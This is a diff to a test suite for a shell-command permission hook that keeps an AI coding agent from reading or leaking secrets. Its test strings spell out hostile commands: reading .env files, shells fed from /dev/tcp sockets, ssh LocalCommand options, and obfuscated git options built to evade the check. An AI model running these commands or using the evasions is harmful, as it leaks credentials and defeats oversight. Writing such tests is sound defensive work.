@@ -62,6 +62,8 @@ fetch_want="SECRET-FETCH BLOCK: this command emits a live secret to stdout (→ 
 fetch_want+=" instead, as the whole command with one redirection of stdout: '... > \$CLAUDE_SECRET_DIR/<name>'. Then"
 fetch_want+=" have a script read that file. A registry password may instead be piped straight into"
 fetch_want+=" '... login --password-stdin'."
+fetch_want+=" If the phrase is only a search pattern, write it to a file in \$CLAUDE_TEMP_DIR and search with"
+fetch_want+=" 'grep -f <file>'."
 fetch_got=$(jq -nc '{tool_input:{command:"aws secretsmanager get-secret-value --secret-id x | cat .env"}}' \
     | "$HOOK" | jq -r '.hookSpecificOutput.permissionDecisionReason')
 if [[ "$fetch_got" == "$fetch_want" ]]; then
@@ -217,8 +219,12 @@ expect DENY  "a reader stage after a newline denied"              $'true |\ncat 
 expect DENY  "a lone reader after leading spaces denied"          '   head .env'
 expect DENY  "an env chain in a later stage denied"               'true | env env cat .env'
 expect DENY  "a stage over the fast-path bound denied"            "true | cat $(printf 'a%.0s' {1..60}) .env"
-for r in cat less more head tail xxd strings od nl tac bat grep rg awk sed jq base64; do
+for r in cat less more head tail xxd strings od nl tac bat awk sed base64; do
     expect DENY "$r in a later stage denied"                      "true | $r .env"
+done
+expect DENY  "jq with a file operand after the filter in a later stage denied" 'true | jq x .env'
+for r in grep rg; do
+    expect DENY "$r with a file operand after the pattern in a later stage denied" "true | $r x .env"
 done
 expect DENY  "cp in a later stage denied"                         'true | cp .env /tmp/claude-x/e'
 expect DENY  "mv in a later stage denied"                         'true | mv .env /tmp/claude-x/e'
@@ -923,7 +929,7 @@ expect ALLOW "a fed parallel with an attached option value allowed" 'ls | parall
 expect DENY  "an ssh LocalCommand option denied"                    'ssh -oPermitLocalCommand=yes -oLocalCommand=env host'
 expect DENY  "an ssh LocalCommand option value denied"              'ssh -o localcommand=env host'
 expect DENY  "an ssh with no remote command fed by a pipe denied"   'echo x | ssh host'
-expect DENY  "an ssh with no remote command fed by a file denied"   'ssh -p 22 -i k host < x.sh'
+expect ALLOW "an ssh with no remote command fed by one file allowed" 'ssh -p 22 -i k host < x.sh'
 expect DENY  "an ssh remote word starting with = denied"            'ssh host =cat .env'
 expect ALLOW "an ssh remote command fed by a pipe allowed"          'echo x | ssh host cat'
 expect ALLOW "an ssh with option values and no command allowed"     'ssh -l user -p 2222 host'
@@ -994,7 +1000,7 @@ expect DENY  "sh -c inside find -exec denied"                      "find . -exec
 expect DENY  "eval denied"                                         'eval cat .env'
 expect DENY  "a command string piped into sh denied"               "echo 'cat .env' | sh"
 expect DENY  "a here-string into sh denied"                        "sh <<< 'cat .env'"
-expect DENY  "a script file fed to bash on stdin denied"           'bash < script.sh'
+expect ALLOW "a script file fed to bash on stdin allowed"          'bash < script.sh'
 expect DENY  "bash -x denied"                                      'bash -x script.sh'
 expect DENY  "zsh -o xtrace denied"                                'zsh -o xtrace script.zsh'
 expect DENY  "bash --verbose denied"                               'bash --verbose script.sh'
@@ -1057,9 +1063,103 @@ expect DENY  "time with an assignment . of a secret denied"        'time FOO=1 .
 expect DENY  "! with an assignment . of a secret denied"           '! FOO=1 . .env'
 expect DENY  "time -p source of a secret denied"                   'time -p source .env'
 
+# Shells fed from a file: one plain file on stdin is the script, as a script file given as an argument is.
+expect ALLOW "bash -s fed by a file allowed"                'bash -s < f'
+expect ALLOW "ssh host bash -s fed by a file allowed"       'ssh host bash -s < f'
+expect ALLOW "sh fed by a file allowed"                     'sh < script.sh'
+expect ALLOW "an explicit fd 0 counts as stdin"             'bash -s 0< f'
+expect ALLOW "a prefix of zeros counts as stdin"            'bash -s 00< f'
+expect ALLOW "a redirection before the shell allowed"       '< f bash -s'
+expect ALLOW "bash -s with arguments fed by a file allowed" 'bash -s x y < f'
+expect ALLOW "ssh host bash -s with no feed allowed"        'ssh host bash -s'
+expect DENY  "ssh host bash -s fed a secret denied"         'ssh host bash -s < config.env'
+expect DENY  "a pipe into ssh host bash -s denied"          'cat f | ssh host bash -s'
+expect DENY  "a pipe into bash -s with a file denied"       'echo x | bash -s < f'
+expect DENY  "bash fed a secret denied"                     'bash < config.env'
+expect DENY  "a here-string into bash -s denied"            "bash -s <<< 'echo hi'"
+expect DENY  "a heredoc into bash -s denied"                $'bash -s <<\'EOF\'\necho\nEOF'
+expect DENY  "a heredoc into ssh host denied"               $'ssh host <<\'EOF\'\necho\nEOF'
+expect DENY  "bash -c with a file on stdin denied"          'bash -c x < f'
+expect DENY  "two stdin files denied"                       'bash -s < f < g'
+expect DENY  "two stdin files, one prefixed, denied"        'bash -s < f 0< g'
+expect DENY  "two stdin files before the shell denied"      '< f < g bash -s'
+expect DENY  "two stdin files to ssh denied"                'ssh host < f < g'
+expect DENY  "a zsh multi-digit prefix next to a file denied" 'bash -s < f 10< g'
+expect DENY  "a zsh multi-digit prefix alone denied"        'bash -s 10< f'
+expect DENY  "a stdin file and a duplicated fd denied"     'bash -s < f 0<&3'
+expect ALLOW "a stdout redirection beside the stdin file allowed"  'bash -s < f > out'
+expect ALLOW "a stderr dup beside the stdin file allowed"          'bash -s < f 2>&1'
+expect ALLOW "a pipe out of the fed shell allowed"                 'bash -s < f | x'
+expect ALLOW "a stderr file beside the stdin file allowed"         'bash -s < f 2>out'
+expect ALLOW "a bare shell with a stderr dup allowed"              'bash 2>&1'
+expect ALLOW "a bare shell with an output and error file allowed"  'bash &> out'
+expect DENY  "an fd 3 dev/tcp onto fd 0 denied"                    'bash < f 3</dev/tcp/h/80 0>&3'
+expect DENY  "an fd 3 dev/tcp beside a stdout dup denied"          'bash < f 3</dev/tcp/h/80 >&0'
+expect DENY  "an fd 3 here-string onto fd 0 denied"                'bash < f 3<<<id 0>&3'
+expect DENY  "an fd 3 file onto fd 0 denied"                       'bash < f 3<g 0>&3'
+expect DENY  "an fd 0 dup before the fd 3 file denied"             'bash < f 0>&3 3<g'
+expect DENY  "an fd 3 write to dev/tcp onto fd 0 denied"           'bash < f 3>/dev/tcp/h/80 0>&3'
+expect DENY  "an fd 3 read-write onto fd 0 denied"                 'bash < f 3<>/dev/tcp/h/80 0>&3'
+expect DENY  "an fd 3 file onto fd 0 for ssh host denied"          'ssh host < f 3<g 0>&3'
+expect DENY  "a chained dup onto fd 0 denied"                      'bash < f 3<g 4>&3 0>&4'
+expect DENY  "another fd's input beside the stdin file denied"     'bash < f 3<g'
+expect DENY  "an fd 0 write to a file denied"                      'bash < f 0>g'
+expect DENY  "an fd 0 append denied"                               'bash < f 0>>g'
+expect DENY  "an fd 0 clobber write denied"                        'bash < f 0>|g'
+expect DENY  "a zero-padded fd 0 dup denied"                       'bash < f 00>&3'
+expect DENY  "a spaced fd 0 dup denied"                            'bash < f 0>& 3'
+expect DENY  "an error-and-output file beside the stdin file denied" 'bash < f &>g'
+expect DENY  "an error-and-output append beside the stdin file denied" 'bash < f &>>g'
+expect DENY  "a stdout dup of fd 0 beside the stdin file denied"   'bash < f >&0'
+expect DENY  "a stdout dup of fd 3 beside the stdin file denied"   'bash < f >&3'
+expect DENY  "an fd 0 write redirection to /dev/tcp denied"        'bash -s 0>/dev/tcp/h/80'
+expect DENY  "an fd 0 append redirection to /dev/tcp denied"       'bash -s 0>>/dev/tcp/h/80'
+expect DENY  "an fd 0 write redirection with no -s denied"         'bash 0>/dev/tcp/h/80'
+expect DENY  "an fd 0 write redirection into sh denied"            'sh 0>/dev/tcp/h/80'
+expect DENY  "an fd 0 output dup denied"                           'bash -s 0>&3'
+expect DENY  "an fd 0 output dup beside a stdin file denied"       'bash -s < f 0>&3'
+expect DENY  "an fd 0 output dup to ssh host bash denied"          'ssh host bash -s 0>&3'
+expect DENY  "an fd 0 output dup to ssh host denied"               'ssh host 0>&3'
+expect DENY  "a zero-padded fd 0 output dup denied"                'bash -s < f 00>&3'
+expect DENY  "a stdin dup after a file on another fd denied"       'bash -s < f 3< config.env 0<&3'
+expect DENY  "a stdin dup before the file denied"                  'bash -s 3<config.env < f <&3'
+expect DENY  "a stdin dup after a here-string on another fd denied" "bash < f 3<<<'id' 0<&3"
+expect DENY  "a stdin read-write of a secret beside a file denied" 'sh < f 0<> config.env'
+expect DENY  "a bare shell fed a duplicated stdin denied"          'bash <&3'
+expect DENY  "a shell word among the -s arguments keeps the check" 'bash -s sh <&3'
+expect DENY  "another shell word among the -s arguments denied"    'bash -s zsh <&3'
+expect DENY  "a zsh process substitution as stdin denied"          'bash < =(echo hi)'
+expect DENY  "a duplicated stdin denied"                  'bash -s <&3'
+expect DENY  "a duplicated stdin with arguments denied"     'bash -s x <&3'
+expect DENY  "a read-write stdin denied"                    'bash -s <> f'
+expect DENY  "bash -x stays denied"                         'bash -x < f'
+expect DENY  "bash -s -x stays denied"                      'bash -s -x < f'
+expect DENY  "bash -sx stays denied"                        'bash -sx < f'
+expect DENY  "bash -s with a later -c denied"               'bash -s < f -c'
+expect DENY  "bash -s fed a /dev/tcp path denied"           'bash -s < /dev/tcp/h/80'
+expect DENY  "bash -s arguments fed a /dev/tcp path denied" 'bash -s x < /dev/tcp/h/80'
+expect DENY  "ssh fed a /dev/tcp path denied"               'ssh host < /dev/tcp/h/80'
+expect DENY  "bash fed /dev/stdin denied"                   'bash < /dev/stdin'
+expect DENY  "sh fed a /dev/fd path denied"                 'sh < /dev/fd/3'
+expect DENY  "bash -s fed /dev/null denied"                 'bash -s < /dev/null'
+expect DENY  "bash -s fed a /proc fd denied"                'bash -s < /proc/self/fd/0'
+expect DENY  "bash -s fed another /proc fd denied"          'bash -s < /proc/1/fd/0'
+expect DENY  "bash -s fed a .. path to /dev denied"         'bash -s < /tmp/../dev/tcp/h/80'
+expect DENY  "bash -s fed a differently cased /dev denied"  'bash -s < /DEV/stdin'
+expect DENY  "bash -s fed a variable denied"                'bash -s < $F'
+expect DENY  "bash -s fed a quoted variable denied"         'bash -s < "$F"'
+expect DENY  "bash -s fed a backquote denied"               'bash -s < `echo f`'
+expect DENY  "bash -s fed a glob denied"                    'bash -s < f*'
+expect DENY  "bash -s fed a brace denied"                   'bash -s <{a,b}'
+
 # xargs and parallel read their input as operands; copiers and accepted carve-outs.
 expect DENY  "echo .env | xargs cat denied"                        'echo .env | xargs cat'
 expect DENY  "find .env | xargs cat denied"                        'find . -name .env | xargs cat'
+expect DENY  "an env dump after plain stages, before a plain stage, denied"  'a | a | printenv | a'
+expect DENY  "a shell fed by a pipe after plain stages denied"              'a | a | sh | a'
+expect DENY  "an input redirection of a secret after plain stages denied"   'a | a | <.env | a'
+expect DENY  "a secret reader after a stage and plain stages denied"        'a | a | cat x | a | a | cat .env'
+expect ALLOW "plain stages around a clean reader allowed"                   'a | a | cat x | a | a'
 expect DENY  "xargs git log of a secret from an earlier stage denied"  'echo .env | xargs git log -p'
 expect DENY  "xargs git show of a secret revision path denied"         'echo HEAD:.env | xargs git show'
 expect DENY  "parallel git show of a secret denied"                    'echo .env | parallel git show HEAD:{}'
@@ -1469,7 +1569,8 @@ expect_in "$RP" ASK "sort of a file operand reads a list, asks"                 
 expect_in "$RP" ASK "sort fed by an input redirection reads a list, asks"       'sort < list | xargs grep -rn KEY'
 expect_in "$RP" ASK "a printf conversion other than %s asks"                    "printf '%b ' x | xargs grep -rn KEY"
 expect_in "$RP" ASK "an echo of an escape asks"                                 "echo '\\x2e\\x2e' | xargs grep -rn KEY"
-expect_in "$RP" ASK "an echo of a brace expansion asks"                         'echo {.,x}. | xargs grep -rn KEY'
+expect_in "$RP" DENY "an echo of a brace expansion naming a root with a secret is denied" \
+    'echo {.,x}. | xargs grep -rn KEY'
 expect_in "$RP" ASK "ls -a lists .., asks"                                      'ls -a | xargs grep -rn KEY'
 expect_in "$RP" ASK "ls -l prints link targets, asks"                           'ls -l | xargs grep -rn KEY'
 expect_in "$RP" ASK "find -exec prints what it runs, asks" 'find . -exec echo {} \; | xargs grep -rn KEY'
@@ -1903,7 +2004,7 @@ expect DENY  "doppler run --mount with a .. out of the vault denied" \
     'doppler run --mount $CLAUDE_SECRET_DIR/../s.json -- npm test'
 expect DENY  "doppler run --mount into a reassigned vault denied" \
     'CLAUDE_SECRET_DIR=/tmp/x doppler run --mount $CLAUDE_SECRET_DIR/s.json -- npm test'
-expect ALLOW "doppler run --mount into the vault allowed" \
+expect ASK "doppler run --mount with the vault path as a separate value asks (--mount= allows)" \
     'doppler run --mount $CLAUDE_SECRET_DIR/s.json -- npm test'
 expect ALLOW "doppler run --mount= and a format into the vault allowed" \
     'doppler run --mount-format json --mount=$CLAUDE_SECRET_DIR/s.json -- npm test'
@@ -2123,13 +2224,29 @@ expect      ALLOW "git -C a repository, a revision and a clean tree, from anothe
 expect_in "$GR" DENY  "a revision tree holding a secret denied"          'git grep -n x HEAD -- .'
 expect_in "$GR" ALLOW "an earlier revision's tree, before the secret, allowed" 'git grep -n x HEAD~1 -- .'
 expect_in "$GR" ALLOW "a revision's clean tree beside an exclude allowed" "git grep -n x HEAD -- docs ':!docs/a.md'"
-expect_in "$GR" ASK   "a revision with only an exclude pathspec asks"    "git grep -n x HEAD -- ':!docs'"
-expect_in "$GR" ASK   "a pathspec holding a pattern asks"                "git grep -n x HEAD -- 'docs/*.md'"
+expect_in "$GR" DENY  "a revision with only an exclude lists its whole tree, denied" "git grep -n x HEAD -- ':!docs'"
+expect_in "$GR" ALLOW "a glob pathspec is listed under its directory"     "git grep -n x HEAD -- 'docs/*.md'"
 expect_in "$GR" ASK   "a pathspec holding a variable asks"               'git grep -n x HEAD -- $F'
 expect_in "$GR" ASK   "a tree-ish operand asks"                          'git grep -n x HEAD:docs -- notes.md'
 expect_in "$GR" ASK   "an unknown revision asks"                         'git grep -n x nosuchrev -- notes.md'
-expect_in "$GR" ASK   "a pathspec absent from the revision asks"         'git grep -n x HEAD~1 -- docs/a.md'
-expect_in "$GR" ASK   "a revision with no -- asks"                       'git grep -n x HEAD'
+expect_in "$GR" ALLOW "a pathspec absent from the revision reads nothing" 'git grep -n x HEAD~1 -- docs/a.md'
+expect_in "$GR" DENY  "a revision with no -- lists its whole tree, denied" 'git grep -n x HEAD'
+expect_in "$GR" ALLOW "a clean revision with no -- allowed"              'git grep -n x HEAD~1'
+expect_in "$GR" ALLOW "-e and a clean revision with no -- allowed"       'git grep -e x HEAD~1'
+expect_in "$GR" ALLOW "a clean revision's root glob allowed"             "git grep -n x HEAD~1 -- '*.md'"
+expect_in "$GR" DENY  "a root glob lists the whole tree, denied"         "git grep -n x HEAD -- '*.md'"
+expect_in "$GR" ALLOW "a clean revision with only an exclude allowed"    "git grep -n x HEAD~1 -- ':!docs'"
+expect_in "$GR" ASK   "two operands with no -- ask"                      'git grep -n x HEAD~1 other'
+expect_in "$GR" ASK   "a revision and an existing path with no -- ask"   'git grep -n x HEAD~1 notes.md'
+expect_in "$GR" ASK   "a tree-ish with no -- asks"                       'git grep -n x HEAD:docs'
+expect_in "$GR" ASK   "other pathspec magic asks"                        "git grep -n x HEAD~1 -- ':(top)docs'"
+expect_in "$GR" ASK   "--recurse-submodules keeps the ask"               'git grep --recurse-submodules -n x HEAD~1'
+expect_in "$GR" ASK   "a glob pathspec climbing out of its directory asks" "git grep -n x HEAD~1 -- 'docs/*/../*'"
+expect_in "$GR" ASK   "an absolute pathspec asks"                        "git grep -n x HEAD~1 -- $GR/docs"
+expect_in "$GR" ASK   "a home-relative pathspec asks"                    'git grep -n x HEAD~1 -- ~/docs'
+expect_in "$GR" ASK   "an escaped revision word asks"                    "git grep -n x \$'\\x2dHEAD' -- notes.md"
+expect_in "$GR" ASK   "a pathspec holding a backslash asks"              "git grep -n x HEAD~1 -- '.en\\v'"
+expect_in "$GR" ASK   "a non-ASCII pathspec absent from the revision asks" "git grep -n x HEAD~1 -- 'döcs'"
 expect_in "$GR" ASK   "a git -c core setting keeps a revision's ask" \
     'git -c core.quotePath=false grep -n x HEAD -- notes.md'
 expect_in "$GR" ASK   "a GIT_CONFIG assignment keeps a revision's ask" \
@@ -2140,6 +2257,201 @@ expect_in "$GR" ASK   "a revision past the walks' git budget asks" \
 expect_in "$GR" ASK   "a tree revision asks"                             'git grep -n x HEAD^{tree} -- notes.md'
 grt=$(git -C "$GR" rev-parse HEAD:docs)
 expect_in "$GR" ASK   "a subtree's object id as the revision asks"       "git grep -n x $grt -- a.md"
+# A revision word git would read as an option, or decode differently, is refused before any cat-file call.
+gstub="$pt/gitstub"
+mkdir -p "$gstub"
+printf '#!/bin/sh\nprintf "%%s\\n" "$*" >>"%s/log"\nexit 1\n' "$gstub" >"$gstub/git"
+chmod +x "$gstub/git"
+: >"$gstub/log"
+PATH="$gstub:$PATH" expect_in "$GR" ASK "an escaped revision word asks without a probe" \
+    "git grep -n x \$'\\x2dHEAD' -- notes.md"
+PATH="$gstub:$PATH" expect_in "$GR" ASK "a revision word starting with - asks without a probe" \
+    'git grep -n x --end-of-options -HEAD'
+PATH="$gstub:$PATH" expect_in "$GR" ASK "a brace-expanded revision word asks without a probe" \
+    'git grep -n x HEAD~{1,0} -- notes.md'
+PATH="$gstub:$PATH" expect_in "$GR" ASK "a wildcard revision word asks without a probe" \
+    "git grep -n x 'HEAD*' -- notes.md"
+if grep -q cat-file "$gstub/log"; then
+    bad "a revision word git could misread reached cat-file"
+else
+    ok "a revision word git could misread never reached cat-file"
+fi
+# A setting that changes how git matches a pathspec voids the absent reading, wherever it comes from.
+expect_in "$GR" ASK   "a pathspec setting before git keeps the ask" \
+    'GIT_ICASE_PATHSPECS=1 git grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "a pathspec setting under env keeps the ask" \
+    'env GIT_ICASE_PATHSPECS=1 git grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "a quoted pathspec setting name keeps the ask" \
+    'GIT_ICASE_PATH""SPECS=1 git grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "an exported pathspec setting keeps the ask" \
+    'export GIT_ICASE_PATHSPECS=1 ; git grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "git --icase-pathspecs keeps the ask" \
+    'git --icase-pathspecs grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "a quoted pathspecs option keeps the ask" \
+    'git --icase-path""specs grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "git --literal-pathspecs keeps the ask" \
+    'git --literal-pathspecs grep -n x HEAD~1 -- notes.md'
+expect_in "$GR" ASK   "a variable written under a computed name keeps the ask" \
+    "printf -v GIT_ICASE_PATHSPEC\$'\\x53' 1 ; export GIT_ICASE_PATHSPEC\$'\\x53' ; git grep -n x HEAD~1 -- DOCS"
+expect_in "$GR" ASK   "a brace-built git option keeps the ask" \
+    'git --icase-pathspe{c,c}s grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "a brace-built env name keeps the ask" \
+    'env GIT_ICASE_PATHSPE{C,C}S=1 git grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "a brace-built env name with an empty branch keeps the ask" \
+    'env GIT_ICASE_PATH{S,}PECS=1 git grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "a bracket git option keeps the ask" \
+    'git --icase-pathspec[s] grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "a wildcard env name keeps the ask" \
+    'env GIT_ICASE_PATH?PECS=1 git grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "a wildcard git option keeps the ask" \
+    'git --icase-pathspec? grep -n x HEAD~1 -- DOCS'
+GIT_NOGLOB_PATHSPECS=1 expect_in "$GR" ASK "a pathspec setting in the hook's environment keeps the ask" \
+    'git grep -n x HEAD~1 -- DOCS'
+expect_in "$GR" ASK   "a pathspec setting before a revision with no -- keeps the ask" \
+    'GIT_ICASE_PATHSPECS=1 git grep -n x HEAD~1'
+expect_in "$GR" ASK   ":(icase) magic asks"                               "git grep -n x HEAD~1 -- ':(icase)DOCS'"
+expect_in "$GR" DENY  "a recased secret-named directory pathspec denied"  'git grep -n x HEAD~1 -- SECRETS/x'
+expect_in "$GR" DENY  "a recased secret-named directory glob denied"      "git grep -n x HEAD~1 -- 'SECRETS/*'"
+expect_in "$GR" DENY  "a recased secret file pathspec denied"             'git grep -n x HEAD~1 -- .ENV'
+expect_in "$GR" DENY  "a brace-expanded revision with no -- is not allowed" 'git grep -n x HEAD~{1,0}'
+git -C "$GR" config core.ignorecase true
+expect_in "$GR" ALLOW "under core.ignorecase a differently cased pathspec still reads nothing" \
+    'git grep -n x HEAD~1 -- DOCS'
+# A secret under sub/deep at HEAD, with the work-tree sub/ emptied, so only the revision's tree shows it.
+GS="$pt/grsub"
+mkdir -p "$GS"
+git -C "$GS" init -q
+printf 'x\n' >"$GS/clean.md"
+git -C "$GS" add clean.md
+git -C "$GS" -c core.hooksPath=/dev/null -c commit.gpgsign=false -c user.name=t -c user.email=t@t.invalid \
+    commit -q --no-verify -m one
+mkdir -p "$GS/sub/deep"
+: >"$GS/sub/deep/.env"
+printf 'x\n' >"$GS/sub/ok.md"
+git -C "$GS" add sub
+git -C "$GS" -c core.hooksPath=/dev/null -c commit.gpgsign=false -c user.name=t -c user.email=t@t.invalid \
+    commit -q --no-verify -m two
+rm -rf "$GS/sub"
+mkdir "$GS/sub"
+# A revision's tree is listed from the repository root whatever directory git runs in.
+expect_in "$GS/sub" DENY  "a revision listed from a subdirectory, denied" 'git grep -n x HEAD'
+expect_in "$GS/sub" DENY  "a tree pathspec listed from a subdirectory, denied" 'git grep -n x HEAD -- deep'
+expect_in "$GS/sub" DENY  "a glob pathspec listed from a subdirectory, denied" "git grep -n x HEAD -- 'd*'"
+expect_in "$GS/sub" DENY  "the dot pathspec listed from a subdirectory, denied" 'git grep -n x HEAD -- .'
+expect_in "$GS" DENY  "git -C a subdirectory, a revision, denied"         'git -C sub grep -n x HEAD'
+expect_in "$GS" DENY  "git -C a subdirectory, the dot pathspec, denied"   'git -C sub grep -n x HEAD -- .'
+expect_in "$GS" ALLOW "a clean revision from the root allowed"            'git grep -n x HEAD~1'
+expect_in "$GS" ALLOW "git -C a subdirectory and a blob allowed"          'git -C sub grep -n x HEAD -- ok.md'
+# A pathspec setting assembled any way voids the absent reading: SUB/deep names sub/deep only if case folds.
+expect_in "$GS" ASK   "a recased pathspec naming a tree of the revision asks, with no setting" \
+    'git grep -n x HEAD~0 -- SUB/deep'
+expect_in "$GS" DENY  "the pathspec spelled as the tree is listed and denied" 'git grep -n x HEAD~0 -- sub/deep'
+expect_in "$GS" ASK   "a recased blob pathspec asks" 'git grep -n x HEAD~0 -- CLEAN.MD'
+expect_in "$GS" ASK   "a glob under a recased directory asks" "git grep -n x HEAD~0 -- 'SUB/*.md'"
+expect_in "$GS" ALLOW "a pathspec with no case variant in the revision allowed" 'git grep -n x HEAD~0 -- clean.md'
+expect_in "$GS" ALLOW "a blob under a directory, spelled as it is, allowed" 'git grep -n x HEAD~0 -- sub/ok.md'
+expect_in "$GS" ALLOW "a pathspec absent in every case allowed" 'git grep -n x HEAD~0 -- nothere'
+expect_in "$GS" ASK   "an option built with a quoted escape asks" \
+    "git --icase-pathspec\$'\\x73' grep -n x HEAD~0 -- SUB/deep"
+expect_in "$GS" ASK   "an option built with an octal escape asks" \
+    "git --icase-pathspec\$'\\163' grep -n x HEAD~0 -- SUB/deep"
+expect_in "$GS" ASK   "an option built with a parameter expansion asks" \
+    'git --icase-path${IFS:0:0}specs grep -n x HEAD~0 -- SUB/deep'
+expect_in "$GS" ASK   "an option built with a variable asks" \
+    's=s ; git --icase-pathspec$s grep -n x HEAD~0 -- SUB/deep'
+expect_in "$GS" ASK   "a glob option built with an escape asks" \
+    "git --glob-path\$'\\x73'pecs grep -n x HEAD~0 -- SUB/deep"
+expect_in "$GS" ASK   "an env name built with an escape asks" \
+    "env GIT_ICASE_PATHSPEC\$'\\x53'=1 git grep -n x HEAD~0 -- SUB/deep"
+expect_in "$GS" ASK   "an env word quoted whole with an escape asks" \
+    "env \$'GIT_ICASE_PATHSPEC\\x53=1' git grep -n x HEAD~0 -- SUB/deep"
+expect_in "$GS" ASK   "an env name built with a parameter expansion asks" \
+    'env GIT_ICASE_PATH${IFS:0:0}SPECS=1 git grep -n x HEAD~0 -- SUB/deep'
+expect_in "$GS" ASK   "an env name built with a variable asks" \
+    'e=SPECS ; env GIT_ICASE_PATH$e=1 git grep -n x HEAD~0 -- SUB/deep'
+expect_in "$GS" ASK   "an env word quoted whole with a variable asks" \
+    'e=SPECS ; env "GIT_ICASE_PATH$e=1" git grep -n x HEAD~0 -- SUB/deep'
+expect_in "$GS" ASK   "an assignment name split by quotes asks" \
+    "GIT_ICASE_PATH''SPECS=1 git grep -n x HEAD~0 -- SUB/deep"
+expect_in "$GS" ASK   "an assignment name quoted whole asks" \
+    'GIT_ICASE_PATHSPECS"=1" git grep -n x HEAD~0 -- SUB/deep'
+expect_in "$GS" ASK   "a pathspecs option name split by quotes elsewhere in the command asks" \
+    'git grep -n x HEAD~0 -- SUB/deep ; echo --icase-path""specs'
+expect_in "$GS" ASK   "an option split by a backslash asks" \
+    'git --icase-path\specs grep -n x HEAD~0 -- SUB/deep'
+expect_in "$GS" ASK   "an option quoted whole asks" \
+    'git "--icase-pathspecs" grep -n x HEAD~0 -- SUB/deep'
+expect_in "$GS" ASK   "an option spelled in a dollar-quote asks" \
+    "git \$'--icase-pathspecs' grep -n x HEAD~0 -- SUB/deep"
+expect_in "$GS" ASK   "an exported name joined from quoted parts asks" \
+    'export "GIT_ICASE_"PATHSPECS=1 ; git grep -n x HEAD~0 -- SUB/deep'
+# A tree holding docs/ and a differently cased Docs/ with a secret: a pathspec that folds case would match both, so a
+# pathspec with a case variant in the tree asks whatever its exact lookup found. Built with plumbing, as a
+# case-folding file system cannot hold both in a work tree.
+GC="$pt/grcase"
+mkdir -p "$GC"
+git -C "$GC" init -q
+git -C "$GC" config core.ignorecase false
+gcb=$(printf 'x\n' | git -C "$GC" hash-object -w --stdin)
+git -C "$GC" update-index --add --cacheinfo 100644,"$gcb",docs/a.md
+git -C "$GC" update-index --add --cacheinfo 100644,"$gcb",Docs/.env
+git -C "$GC" update-index --add --cacheinfo 100644,"$gcb",döcs/a.md
+git -C "$GC" -c core.hooksPath=/dev/null -c commit.gpgsign=false -c user.name=t -c user.email=t@t.invalid \
+    commit -q --no-verify -m one
+expect_in "$GC" ASK   "a tree pathspec beside a differently cased sibling asks" 'git grep -n x HEAD -- docs'
+expect_in "$GC" ASK   "a tree pathspec with a trailing slash beside a sibling asks" 'git grep -n x HEAD -- docs/'
+expect_in "$GC" ASK   "a glob under a directory with a cased sibling asks" "git grep -n x HEAD -- 'docs/*.md'"
+expect_in "$GC" DENY  "the sibling spelled exactly is listed and denied" 'git grep -n x HEAD -- Docs'
+expect_in "$GC" ALLOW "a blob with no case variant, beside a sibling directory, allowed" \
+    'git grep -n x HEAD -- docs/a.md'
+expect_in "$GC" ASK   "a non-ASCII tree pathspec that exists asks" "git grep -n x HEAD -- 'döcs'"
+# An entry with a newline in its name cannot be told apart from two in the line listing: the check fails closed.
+GN="$pt/grnl"
+mkdir -p "$GN"
+git -C "$GN" init -q
+git -C "$GN" config core.ignorecase false
+gnb=$(printf 'x\n' | git -C "$GN" hash-object -w --stdin)
+git -C "$GN" update-index --add --cacheinfo 100644,"$gnb",clean.md
+git -C "$GN" update-index --add --cacheinfo 100644,"$gnb",$'nl\nname'
+git -C "$GN" -c core.hooksPath=/dev/null -c commit.gpgsign=false -c user.name=t -c user.email=t@t.invalid \
+    commit -q --no-verify -m one
+expect_in "$GN" ASK   "a tree holding a newline-named entry asks" 'git grep -n x HEAD -- clean.md'
+# A gitlink hides what the path under it holds in the submodule, which --recurse-submodules searches.
+GM="$pt/grmod"
+mkdir -p "$GM/subm/dir"
+git -C "$GM" init -q
+printf 'x\n' >"$GM/clean.md"
+git -C "$GM" add clean.md
+git -C "$GM" update-index --add --cacheinfo 160000,"$(git -C "$GM" hash-object clean.md)",subm
+git -C "$GM" -c core.hooksPath=/dev/null -c commit.gpgsign=false -c user.name=t -c user.email=t@t.invalid \
+    commit -q --no-verify -m one
+expect_in "$GM" ALLOW "a path under a gitlink, without --recurse-submodules, allowed" 'git grep -n x HEAD -- subm/dir'
+expect_in "$GM" ASK   "a path under a gitlink with --recurse-submodules asks" \
+    'git grep --recurse-submodules -n x HEAD -- subm/dir'
+expect_in "$GM" ASK   "--recurse-submodules built from a parameter expansion asks" \
+    'git grep --recurse-sub${X}modules -n x HEAD -- subm/dir'
+expect_in "$GM" ASK   "--recurse-submodules built from an escape asks" \
+    "git grep --recurse-sub\$'\\x6d'odules -n x HEAD -- subm/dir"
+expect_in "$GM" ASK   "--recurse-submodules built from a parameter expansion, dot pathspec, asks" \
+    'git grep --recurse-sub${X}modules -n x HEAD -- .'
+expect_in "$GM" ASK   "an option held in a brace asks" 'git grep -n --recurse-submodule{s,s} x HEAD -- subm/dir'
+expect_in "$GM" ASK   "an option with a wildcard asks" "git grep -n --recurse-sub*modules x HEAD -- subm/dir"
+expect_in "$GM" ASK   "a quoted option holding a wildcard asks" "git grep -n '--recurse-sub*modules' x HEAD -- subm/dir"
+expect_in "$GM" ALLOW "a whole revision over a gitlink, without a recursion setting, allowed" 'git grep -n x HEAD'
+expect_in "$GM" ALLOW "a dot pathspec over a gitlink, without a recursion setting, allowed" 'git grep -n x HEAD -- .'
+# submodule.recurse in the repository makes git grep search the submodules of a revision too.
+GU="$pt/grsubrec"
+cp -R "$GM" "$GU"
+git -C "$GU" config submodule.recurse true
+expect_in "$GU" ASK   "a whole revision under submodule.recurse asks"        'git grep -n x HEAD'
+expect_in "$GU" ASK   "a dot pathspec under submodule.recurse asks"         'git grep -n x HEAD -- .'
